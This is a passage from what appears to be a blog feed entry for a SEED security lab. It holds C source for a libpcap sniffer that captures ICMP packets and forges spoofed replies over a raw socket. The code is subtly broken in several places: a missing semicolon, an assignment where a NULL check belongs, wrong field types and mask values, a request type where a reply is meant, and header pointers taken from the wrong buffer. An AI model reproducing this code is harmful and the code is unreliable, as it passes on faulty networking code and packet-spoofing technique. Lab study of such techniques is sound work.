class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> APP_NAME <span class="string">&quot;sniffex&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_DESC <span class="string">&quot;sniffer example using libcap&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_COPYRIGHT <span class="string">&quot;COPY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_DISCLAIMER <span class="string">&quot;NO WARNNING&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in_systm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip_icmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SNAP_LEN 1518</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ETHERNET 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_ethernet</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_char ether_dhost[ETHER_ADDR_LEN];</span><br><span class="line">    u_char ether_shost[ETHER_ADDR_LEN];</span><br><span class="line">    u_short ether_type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_char ip_vhl;</span><br><span class="line">    u_char ip_tos;</span><br><span class="line">    u_short ip_len;</span><br><span class="line">    u_short ip_id;</span><br><span class="line">    u_short ip_off;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_RF 0x8000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_DF 0x4000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_MF 0x2000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_OFFMASK 0x1ffff</span></span><br><span class="line">    u_char ip_ttl;</span><br><span class="line">    u_char ip_p;</span><br><span class="line">    u_char ip_sum;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HL(ip) (((ip)-&gt;ip_vhl) &amp; 0x0f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_V(ip) (((ip)-&gt;ip_vhl) &gt;&gt;4)</span></span><br><span class="line"><span class="keyword">typedef</span> u_int tcp_seq;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_tcp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_short th_sport;</span><br><span class="line">    u_short th_dport;</span><br><span class="line">    tcp_seq th_seq;</span><br><span class="line">    tcp_seq th_ack;</span><br><span class="line">    u_char th_offx2;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_OFF(th) (((th)-&gt;th_offx2 &amp; 0xf0) &gt;&gt;4 )</span></span><br><span class="line">    u_char th_flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FIN 0x01</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_SYN 0x02</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_RST 0x04</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ACK 0x10</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_URG 0x20</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ECE 0x40</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_CWR 0x80</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FLAGS</span></span><br><span class="line">    (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line">    u_short th_win;</span><br><span class="line">    u_short th_sum;</span><br><span class="line">    u_short th_urp;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_icmp</span> &#123;</span></span><br><span class="line">    u_char icmp_type;</span><br><span class="line">    u_char icmp_code;</span><br><span class="line">    u_short icmp_chksum;</span><br><span class="line">    u_short icmp_n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args,<span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_payload</span><span class="params">(<span class="type">const</span> u_char *payload ,<span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex_ascill_line</span><span class="params">(<span class="type">const</span> u_char *payload,<span class="type">int</span> len,<span class="type">int</span> offset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_banner</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_usage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_banner</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>,APP_NAME,APP_DESC);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,APP_COPYRIGHT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,APP_DISCLAIMER);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_usage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [interface]\n&quot;</span>,APP_NAME);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; interface listen on &lt;interface&gt; for packets. \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex_ascill_line</span><span class="params">(<span class="type">const</span> u_char *payload,<span class="type">int</span> len,<span class="type">int</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> gap;</span><br><span class="line">    <span class="type">const</span> u_char *ch;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%05d &quot;</span>,offset);</span><br><span class="line">    ch = payload;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,*ch);</span><br><span class="line">        ch++;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">7</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">16</span>)&#123;</span><br><span class="line">        gap = <span class="number">16</span>-len;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;gap;i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    ch =payload;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isprint</span>(*ch))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*ch);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        ch++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_payload</span><span class="params">(<span class="type">const</span> u_char *payload ,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len_rem = len;</span><br><span class="line">    <span class="type">int</span> line_width = <span class="number">16</span>;</span><br><span class="line">    <span class="type">int</span> line_len;</span><br><span class="line">    <span class="type">int</span> offset=<span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> u_char *ch = payload;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len &lt;=line_width)</span><br><span class="line">    &#123;</span><br><span class="line">        print_hex_ascill_line(ch,len,offset);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( ; ; )&#123;</span><br><span class="line">        line_len = line_width % len_rem;</span><br><span class="line">        print_hex_ascill_line(ch,line_len,offset);</span><br><span class="line">        len_rem = len_rem - line_len;</span><br><span class="line">        ch = ch+ line_len;</span><br><span class="line">        offset = offset + line_width;</span><br><span class="line">        <span class="keyword">if</span>(len_rem &lt;= line_width)&#123;</span><br><span class="line">            print_hex_ascill_line(ch,len_rem,offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_icmpreply</span><span class="params">(u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">old_ip_header</span>;</span></span><br><span class="line">    old_ip_header = (<span class="keyword">struct</span> sniff_ip *)(packet + SIZE_ETHERNET);</span><br><span class="line">    <span class="type">int</span> ip_len = ntohs(old_ip_header-&gt;ip_len);</span><br><span class="line">    <span class="type">char</span> buf[ip_len];</span><br><span class="line">    bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,(packet + SIZE_ETHERNET),<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="type">char</span> *ptr = buf;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">ip_header</span> =</span> (<span class="keyword">struct</span> sniff_ip*)(ptr);</span><br><span class="line">    <span class="type">int</span> size_ip_header = IP_HL(ip_header)*<span class="number">4</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sniff_icmp</span> *<span class="title">icmp_header</span>;</span></span><br><span class="line">    icmp_header = (<span class="keyword">struct</span> sniff_icmp*)(packet +size_ip_header);</span><br><span class="line">    icmp_header-&gt;icmp_type = <span class="number">8</span>;</span><br><span class="line">    icmp_header-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">    icmp_header-&gt;icmp_n =<span class="number">0</span> ;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">tempAddress</span> =</span> ip_header-&gt;ip_dst;</span><br><span class="line">    ip_header-&gt;ip_dst = ip_header-&gt;ip_src;</span><br><span class="line">    ip_header-&gt;ip_src = tempAddress;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dst</span>;</span></span><br><span class="line">    dst.sin_family = AF_INET;</span><br><span class="line">    inet_pton(AF_INET,inet_ntoa(ip_header-&gt;ip_dst),&amp;dst.sin_addr.s_addr);</span><br><span class="line">    dst.sin_port = htons(<span class="number">0</span>);</span><br><span class="line">    icmp_header-&gt;icmp_n ++ ;</span><br><span class="line">    <span class="type">int</span> one = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);</span><br><span class="line">    setsockopt(s,IPPROTO_IP,IP_HDRINCL,&amp;one,<span class="keyword">sizeof</span>(one));</span><br><span class="line">    sendto(s,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>,(<span class="keyword">struct</span> sockaddr *)&amp;dst ,<span class="keyword">sizeof</span>(dst));</span><br><span class="line">    close(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args,<span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ethernet</span> *<span class="title">ethernet</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_tcp</span> *<span class="title">tcp</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *payload;</span><br><span class="line">    <span class="type">int</span> size_ip;</span><br><span class="line">    <span class="type">int</span> size_tcp;</span><br><span class="line">    <span class="type">int</span> size_payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Packet number %d: \n&quot;</span>,count);</span><br><span class="line">    count++;</span><br><span class="line">    ethernet = (<span class="keyword">struct</span> sniff_ethernet*)(packet);</span><br><span class="line">    ip = (<span class="keyword">struct</span> sniff_ip*)(packet + SIZE_ETHERNET);</span><br><span class="line">    size_ip = IP_HL(ip)*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size_ip&lt;<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *Invalid IP header length : %u bytes \n&quot;</span>,size_ip);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; From: %s\n&quot;</span>, inet_ntoa(ip-&gt;ip_src));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; To: %s\n&quot;</span>, inet_ntoa(ip-&gt;ip_dst));</span><br><span class="line">    <span class="keyword">switch</span>(ip-&gt;ip_p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_TCP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: TCP\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_UDP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: UDP\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_ICMP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: ICMP\n&quot;</span>);</span><br><span class="line">            send_icmpreply(packet);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: others\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tcp = (<span class="keyword">struct</span> sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);</span><br><span class="line">    size_tcp = TH_OFF(tcp)*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size_tcp &lt; <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *Invalid TCP header length : %u bytes \n&quot;</span>,size_tcp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; Src port: %d\n&quot;</span>,ntohs(tcp-&gt;th_sport));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; Dst port: %d\n&quot;</span>,ntohs(tcp-&gt;th_dport));</span><br><span class="line">    payload = (u_char*)(packet + SIZE_ETHERNET +size_ip + size_tcp);</span><br><span class="line">    size_payload = ntohs(ip-&gt;ip_len) - size_ip - size_tcp;</span><br><span class="line">    <span class="keyword">if</span> ( size_payload &gt;<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; Payload (%d bytes):\n&quot;</span>,size_payload);</span><br><span class="line">        print_payload(payload,size_payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *dev = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="type">pcap_t</span> *handle;</span><br><span class="line">    <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">    bpf_u_int32 mask;</span><br><span class="line">    bpf_u_int32 net;</span><br><span class="line">    <span class="type">int</span> num_packets = <span class="number">100</span>;</span><br><span class="line">    print_app_banner();</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">2</span> )&#123;</span><br><span class="line">        dev = argv[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error:unrecongnized command_line options\n\n&quot;</span> );</span><br><span class="line">        print_app_usage();</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dev = pcap_lookupdev(errbuf);</span><br><span class="line">        <span class="keyword">if</span>(dev = <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t find default device: %s\n&quot;</span>,errbuf);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_lookupnet(dev,&amp;net,&amp;mask,errbuf) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t get netmask for device %s: %s\n&quot;</span>,dev,errbuf);</span><br><span class="line">        net = <span class="number">0</span>;</span><br><span class="line">        mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Device: %s\n&quot;</span>,dev);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of packets: %d\n&quot;</span>,num_packets);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Filter expression: %s\n&quot;</span>,filter_exp);</span><br><span class="line">    handle = pcap_open_live(dev,SNAP_LEN,<span class="number">1</span>,<span class="number">1000</span>,errbuf);</span><br><span class="line">    <span class="keyword">if</span>(handle == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t open device %s : %s\n&quot;</span>,dev,errbuf);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_datalink(handle) != DLT_EN10MB)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s is not an Ethernet\n&quot;</span>,dev);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_compile(handle,&amp;fp,filter_exp,<span class="number">0</span>,net) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t parse filter %s : %s\n&quot;</span>,filter_exp,pcap_geterr(handle));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pcap_setfilter(handle,&amp;fp) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t install filter %s : %s\n&quot;</span>,filter_exp,pcap_geterr(handle));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    pcap_loop(handle,num_packets,got_packet,<span class="literal">NULL</span>);</span><br><span class="line">    pcap_freecode(&amp;fp);</span><br><span class="line">    pcap_close(handle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Capture complete. \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
